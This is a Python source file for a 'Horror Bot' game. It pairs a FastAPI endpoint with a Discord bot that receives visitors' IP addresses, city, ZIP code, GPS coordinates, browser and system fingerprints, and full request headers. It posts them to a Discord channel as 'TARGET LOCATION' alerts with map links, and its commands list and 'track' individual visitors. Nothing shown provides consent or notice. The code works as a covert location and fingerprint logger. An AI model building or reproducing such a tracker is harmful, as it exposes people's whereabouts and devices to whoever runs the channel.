import os
import json
import random
import asyncio
import threading
from datetime import datetime
from fastapi import FastAPI, Request, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
import discord
from discord.ext import commands
from discord import Embed, Color
import uvicorn
from typing import Optional
import aiohttp
from dotenv import load_dotenv

load_dotenv()

# Discord Bot Setup
TOKEN = os.getenv('DISCORD_TOKEN')
CHANNEL_ID = int(os.getenv('DISCORD_CHANNEL_ID', '0'))

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# FastAPI Setup
app = FastAPI()

# Allow all origins for now (you can restrict later)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Changed to allow all for testing
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Data storage
tracked_users = {}
command_counter = 0
bot_ready = False

# ==================== DISCORD BOT ====================
@bot.event
async def on_ready():
    global bot_ready
    bot_ready = True
    print(f'🎮 Horror Bot is online as {bot.user}')
    print(f'📡 Connected to Discord!')
    await bot.change_presence(activity=discord.Game(name="Watching 👁️"))

@bot.event
async def on_command_error(ctx, error):
    print(f"Bot error: {error}")
    await ctx.send(f"⚠️ Error: {error}")

# Cool embed generator
def create_horror_embed(title: str, data: dict, user_info: Optional[dict] = None):
    colors = [Color.red(), Color.dark_red(), Color.purple(), Color.dark_purple()]
    
    embed = Embed(
        title=f"⚠️ {title} ⚠️",
        description=f"```{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```",
        color=random.choice(colors)
    )
    
    # Extract data properly
    data_content = data.get('data', data) if isinstance(data, dict) else {}
    
    # Add scary fields based on type
    if data.get('type') == 'location' or 'lat' in str(data_content):
        # Handle location data
        lat = data_content.get('lat', 'unknown')
        lon = data_content.get('lon', 'unknown')
        city = data_content.get('city', 'unknown')
        state = data_content.get('state', 'unknown')
        zip_code = data_content.get('zip', 'unknown')
        ip = data_content.get('ip', 'unknown')
        
        embed.add_field(
            name="📍 TARGET LOCATION",
            value=f"```\nIP: {ip}\nCity: {city}\nState: {state}\nZIP: {zip_code}\nLat: {lat}\nLon: {lon}```",
            inline=False
        )
        
        # Add Google Maps link
        if lat != 'unknown' and lon != 'unknown':
            maps_url = f"https://www.google.com/maps?q={lat},{lon}"
            embed.add_field(name="🗺️ MAP LINK", value=f"[View Target]({maps_url})", inline=False)
    
    elif data.get('type') == 'fragment' or 'fragment' in str(data):
        # Handle puzzle fragment collection
        fragment_id = data_content.get('id', 'unknown')
        fragment_title = data_content.get('title', 'unknown')
        
        embed.add_field(
            name="📖 FRAGMENT COLLECTED",
            value=f"```ID: {fragment_id}\nTitle: {fragment_title}```",
            inline=False
        )
        
        total = data_content.get('total', 20)
        found = data_content.get('found', 0)
        embed.add_field(name="📊 PROGRESS", value=f"```{found}/{total}```", inline=True)
    
    elif data.get('type') == 'chaos':
        # Handle chaos button presses
        button = data_content.get('button', 'unknown')
        effect = data_content.get('effect', 'unknown')
        
        embed.add_field(
            name="🌀 CHAOS UNLEASHED",
            value=f"```Button: {button}\nEffect: {effect}```",
            inline=False
        )
    
    elif data.get('type') == 'system':
        # Handle system fingerprint
        browser = data_content.get('browser', 'unknown')
        os = data_content.get('os', 'unknown')
        screen = data_content.get('screen', 'unknown')
        cores = data_content.get('cores', 'unknown')
        
        embed.add_field(name="💻 SYSTEM", value=f"```{os}```", inline=True)
        embed.add_field(name="🌐 BROWSER", value=f"```{browser[:30]}...```", inline=True)
        embed.add_field(name="🖥️ SCREEN", value=f"```{screen}```", inline=True)
        embed.add_field(name="⚡ CORES", value=f"```{cores}```", inline=True)
    
    else:
        # Generic data
        data_str = json.dumps(data_content, indent=2)[:500]
        embed.add_field(name="📦 DATA", value=f"```{data_str}```", inline=False)
    
    # Add user info if available
    if user_info:
        embed.set_footer(text=f"User: {user_info.get('ip', 'unknown')} | {user_info.get('time', '')}")
    else:
        # Random spooky footer
        spooky_footers = [
            "They know where you live",
            "The fragments are scattered",
            "Your screen is being recorded",
            "We can see you",
            "Don't turn around",
            "Behind you",
            "👁️",
            "The puzzle continues",
            "Find all 20 pieces",
            "The truth is hidden"
        ]
        embed.set_footer(text=random.choice(spooky_footers))
    
    return embed

# ==================== DISCORD COMMANDS ====================
@bot.command(name='track')
async def track_user(ctx, user_id: str = None):
    """Track a specific user by ID"""
    if not bot_ready:
        await ctx.send("⚠️ Bot is still initializing...")
        return
        
    if user_id and user_id in tracked_users:
        data = tracked_users[user_id]
        embed = create_horror_embed(f"TRACKING USER {user_id[:8]}", data.get('data', {}), data.get('user_info'))
        await ctx.send(embed=embed)
    else:
        # Show list of recent users
        if tracked_users:
            recent = list(tracked_users.keys())[-5:]
            users_list = "\n".join([f"• {uid[:8]}..." for uid in recent])
            await ctx.send(f"⚠️ User not found. Recent users:\n{users_list}\n\nUse `!track [id]` with one of these IDs")
        else:
            await ctx.send("⚠️ No users tracked yet")

@bot.command(name='stats')
async def show_stats(ctx):
    """Show tracking statistics"""
    global command_counter
    command_counter += 1
    
    if not bot_ready:
        await ctx.send("⚠️ Bot is still initializing...")
        return
    
    embed = Embed(
        title="📊 SURVEILLANCE STATISTICS",
        color=Color.red()
    )
    
    embed.add_field(name="👥 Total Users", value=f"```{len(tracked_users)}```", inline=True)
    embed.add_field(name="📝 Commands Run", value=f"```{command_counter}```", inline=True)
    embed.add_field(name="🎮 Bot Status", value="```ACTIVE```", inline=True)
    
    # Fragment stats
    total_fragments = sum(1 for u in tracked_users.values() 
                         if u.get('data', {}).get('type') == 'fragment')
    embed.add_field(name="📖 Fragments", value=f"```{total_fragments}```", inline=True)
    
    # Chaos stats
    chaos_count = sum(1 for u in tracked_users.values() 
                     if u.get('data', {}).get('type') == 'chaos')
    embed.add_field(name="🌀 Chaos Events", value=f"```{chaos_count}```", inline=True)
    
    await ctx.send(embed=embed)

@bot.command(name='alert')
async def send_alert(ctx, *, message: str):
    """Send a creepy alert"""
    if not bot_ready:
        await ctx.send("⚠️ Bot is still initializing...")
        return
        
    embed = Embed(
        title="⚠️ GLOBAL ALERT ⚠️",
        description=f"```{message}```",
        color=Color.dark_red()
    )
    embed.set_footer(text="The fragments are watching")
    await ctx.send(embed=embed)

@bot.command(name='help_horror')
async def horror_help(ctx):
    """Show all commands"""
    if not bot_ready:
        await ctx.send("⚠️ Bot is still initializing...")
        return
        
    embed = Embed(
        title="👁️ HORROR BOT COMMANDS",
        description="All surveillance commands",
        color=Color.purple()
    )
    
    commands_list = [
        "`!track [id]` - Track specific user",
        "`!stats` - Show surveillance statistics",
        "`!alert [message]` - Send global alert",
        "`!users` - List recent users",
        "`!clear` - Clear all tracked users",
        "`!broadcast [msg]` - Broadcast message",
        "`!scream` - Make everyone scream",
        "`!glitch` - Glitch all screens"
    ]
    
    embed.add_field(name="📡 AVAILABLE COMMANDS", value="\n".join(commands_list), inline=False)
    embed.set_footer(text="Use with caution... they can see you too")
    
    await ctx.send(embed=embed)

@bot.command(name='users')
async def list_users(ctx):
    """List recent users"""
    if not bot_ready:
        await ctx.send("⚠️ Bot is still initializing...")
        return
        
    if not tracked_users:
        await ctx.send("📡 No users tracked yet")
        return
    
    users_list = []
    for uid, data in list(tracked_users.items())[-10:]:
        ip = data.get('user_info', {}).get('ip', 'unknown')
        time = data.get('user_info', {}).get('time', 'unknown')[-8:]
        users_list.append(f"• `{uid[:8]}` - {ip} - {time}")
    
    embed = Embed(
        title="👥 RECENT USERS",
        description="\n".join(users_list),
        color=Color.dark_red()
    )
    embed.set_footer(text=f"Total: {len(tracked_users)} users")
    await ctx.send(embed=embed)

@bot.command(name='clear')
async def clear_users(ctx):
    """Clear all tracked users"""
    if not bot_ready:
        await ctx.send("⚠️ Bot is still initializing...")
        return
        
    global tracked_users
    count = len(tracked_users)
    tracked_users = {}
    await ctx.send(f"🧹 Cleared {count} users from tracking")

@bot.command(name='broadcast')
async def broadcast(ctx, *, message: str):
    """Broadcast a message"""
    embed = Embed(
        title="📢 SYSTEM BROADCAST",
        description=f"```{message}```",
        color=Color.red()
    )
    embed.set_footer(text="Message received by all active sessions")
    await ctx.send(embed=embed)

@bot.command(name='scream')
async def make_scream(ctx):
    """Make everyone scream"""
    embed = Embed(
        title="🔊 GLOBAL SCREAM",
        description="```AAAAAAAAAAAAAAAAAAAAH```",
        color=Color.dark_red()
    )
    embed.set_footer(text="They can hear you")
    await ctx.send(embed=embed)

@bot.command(name='glitch')
async def glitch_all(ctx):
    """Glitch all connected screens"""
    embed = Embed(
        title="🌀 GLOBAL GLITCH",
        description="```Initiating screen corruption...```",
        color=Color.purple()
    )
    embed.add_field(name="Status", value="```ACTIVE```", inline=True)
    embed.add_field(name="Users Affected", value=f"```{len(tracked_users)}```", inline=True)
    await ctx.send(embed=embed)

# ==================== FASTAPI ENDPOINTS ====================
@app.post("/api/track")
async def track_user_data(request: Request):
    """Receive tracking data from frontend"""
    try:
        data = await request.json()
        client_ip = request.client.host
        
        print(f"📡 Received data from {client_ip}: {data.get('type', 'unknown')}")
        
        # Store user data
        user_id = f"{client_ip}_{datetime.now().timestamp()}"
        tracked_users[user_id] = {
            'data': data,
            'user_info': {
                'ip': client_ip,
                'time': datetime.now().isoformat(),
                'headers': dict(request.headers)
            }
        }
        
        # Clean up old users (keep last 100)
        if len(tracked_users) > 100:
            oldest = sorted(tracked_users.keys())[:50]
            for uid in oldest:
                del tracked_users[uid]
        
        # Send to Discord if bot is ready
        if bot_ready:
            try:
                channel = bot.get_channel(CHANNEL_ID)
                if channel:
                    embed = create_horror_embed(
                        f"NEW DATA - {data.get('type', 'unknown').upper()}",
                        data,
                        {'ip': client_ip, 'time': datetime.now().strftime('%H:%M:%S')}
                    )
                    await channel.send(embed=embed)
                    
                    # If location data exists, send map
                    data_content = data.get('data', {})
                    if data.get('type') == 'location':
                        maps_url = f"https://www.google.com/maps?q={data_content.get('lat')},{data_content.get('lon')}"
                        await channel.send(f"📍 [Target Location]({maps_url})")
            except Exception as e:
                print(f"Discord send error: {e}")
        
        return JSONResponse({
            "status": "tracked", 
            "user_id": user_id,
            "total_users": len(tracked_users)
        })
    
    except Exception as e:
        print(f"Error tracking data: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)

@app.get("/api/stats")
async def get_stats():
    """Get tracking statistics"""
    return {
        "total_users": len(tracked_users),
        "active_sessions": len(tracked_users),
        "bot_ready": bot_ready,
        "last_update": datetime.now().isoformat()
    }

@app.get("/api/health")
async def health_check():
    """Health check endpoint"""
    return {
        "status": "alive",
        "bot_ready": bot_ready,
        "users_tracked": len(tracked_users),
        "timestamp": datetime.now().isoformat()
    }

# ==================== RUN BOTH ====================
async def run_bot():
    try:
        await bot.start(TOKEN)
    except Exception as e:
        print(f"Bot failed to start: {e}")

def run_api():
    print("🚀 Starting FastAPI server on port 8000...")
    uvicorn.run(app, host="0.0.0.0", port=8000)

if __name__ == "__main__":
    print("🎮 Starting Horror Bot and API...")
    
    # Run bot in separate thread
    def start_bot():
        asyncio.run(run_bot())
    
    bot_thread = threading.Thread(target=start_bot, daemon=True)
    bot_thread.start()
    
    # Run API
    run_api()
